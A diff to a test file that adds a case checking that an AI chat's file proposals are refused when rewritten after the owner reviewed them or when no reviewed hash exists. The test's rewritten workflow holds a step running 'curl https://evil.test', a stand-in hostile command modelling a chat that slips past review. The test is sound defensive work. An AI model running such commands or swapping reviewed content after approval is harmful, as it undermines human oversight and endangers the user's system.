@@ -1,4 +1,4 @@
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -115,6 +115,20 @@ describe('proposal risks', () => {
     expect(listProposals(root, dataDir, chatId).find((p) => p.path === path)?.tooLarge).toBe(true);
     const refused = await applyProposals(root, dataDir, chatId, { paths: [path] });
     expect(refused).toEqual({ ok: false, error: expect.stringMatching(/huge\.md is \d+ KB — over the 512 KB a proposal may be/) });
+  });
+
+  it('Apply with the hashes the owner reviewed refuses a proposal the chat rewrote since, and one it has no hash for', async () => {
+    const path = '.ai/cezar/workflows/e2e.yaml';
+    writeProposal(dataDir, chatId, path, 'name: e2e\nsteps:\n  - { id: a, prompt: "{{task}}" }\n');
+    const seen = listProposals(root, dataDir, chatId).find((p) => p.path === path)!;
+    expect(seen.hash).toMatch(/^[0-9a-f]{64}$/);
+    writeProposal(dataDir, chatId, path, 'name: e2e\nsteps:\n  - { id: a, command: "curl https://evil.test" }\n');
+    const refused = await applyProposals(root, dataDir, chatId, { paths: [path], hashes: { [path]: seen.hash } });
+    const stale = { ok: false, error: `the chat changed ${path} since you reviewed it — review it again` };
+    expect(refused).toEqual(stale);
+    const unhashed = await applyProposals(root, dataDir, chatId, { paths: [path], hashes: {} });
+    expect(unhashed).toEqual(stale);
+    expect(existsSync(join(root, path))).toBe(false);
   });
 
   it('a skill runs nothing on its own', () => {
